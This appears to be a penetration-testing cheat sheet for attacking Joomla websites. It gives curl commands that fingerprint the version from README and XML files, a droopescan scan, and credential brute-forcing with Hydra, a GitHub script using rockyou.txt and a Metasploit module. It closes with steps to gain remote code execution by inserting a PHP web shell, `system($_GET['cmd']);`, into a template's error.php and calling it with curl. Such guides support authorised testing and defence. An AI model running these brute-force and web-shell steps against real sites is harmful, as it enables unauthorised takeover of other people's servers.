### **Introduction**

Joomla is a free and open-source content management system (CMS) used to create, manage, and publish digital content on websites. It provides a user-friendly interface and a range of features that allow users to build and maintain websites without needing to write code. Joomla is highly customizable, supporting extensions and templates to enhance functionality and design, making it a popular choice for websites of all sizes—from personal blogs to large corporate sites.

### **Identifying Joomla Version**

1.  Obtain Joomla Version from README:  
    `curl -s http://[JOOMLA-DOMAIN]/README.txt | head -n 5`
    
    ```
    Joomla! version 3.9.22
    Copyright (c) 2005 - 2020 Open Source Matters.
    All rights reserved.
    Licensed under GNU General Public License.
    ```
    
2.  Check Version in Language Configuration:  
    `curl -s http://[JOOMLA-DOMAIN]/language/en-GB/en-GB.xml`
    
    ```xml
    <metadata>
        <name>English (United Kingdom)</name>
        <version>3.9.22</version>
        <description>English (United Kingdom) Language Pack</description>
    </metadata>
    ```
    
3.  Check Version in XML Configuration Files:  
    `curl -s http://[JOOMLA-DOMAIN]/plugins/system/cache/cache.xml`
    
    ```xml
    <extension version="3.9.22" type="plugin" method="upgrade">
        <name>cache</name>
        <author>Joomla! Project</author>
        <creationDate>April 2020</creationDate>
    </extension>
    ```
    
4.  Check Version in Administrator Manifests:  
    `curl -s http://[JOOMLA-DOMAIN]/administrator/manifests/files/joomla.xml | xmllint --format -`
    
    ```xml
    <extension type="file" version="3.9.22" method="upgrade">
        <name>joomla</name>
        <author>Joomla! Project</author>
        <creationDate>September 2020</creationDate> 
        <description>Joomla! Core Files</description>
    </extension>`
    ```
    

### **Automatic Scanning**

1.  Use Droopescan for automatic scanning:  
    `droopescan scan joomla --url http://[JOOMLA-DOMAIN]/`

### **Brute Forcing Login Credentials**

1.  Using Hydra for Credential Brute-Forcing:  
    `hydra -L users.txt -P passwds.txt [JOOMLA-DOMAIN] http-get /administrator/index.php`
2.  Using [joomla-brute.py](https://github.com/ajnik/joomla-bruteforce) for Credential Brute-Forcing:  
    `sudo python3 joomla-brute.py -u http://[JOOMLA-DOMAIN] -w /usr/share/wordlist/rockyou.txt -usr admin`
3.  Using Metasploit for Credential Brute-Forcing:  
    `msf > use auxiliary/scanner/http/joomla_bruteforce_login`

### **Gain RCE by Injecting PHP Code in a Template**

1.  Navigate to Templates in Joomla Admin Panel.
2.  Select protostar from the Template list.
3.  Access the Templates: Customize page.
4.  Edit the error.php page and insert the following PHP code:  
    `system($_GET['cmd']);`
5.  Save the changes.
6.  Trigger the RCE with:  
    `curl -s http://[JOOMLA-DOMAIN]/templates/protostar/error.php?cmd=id`
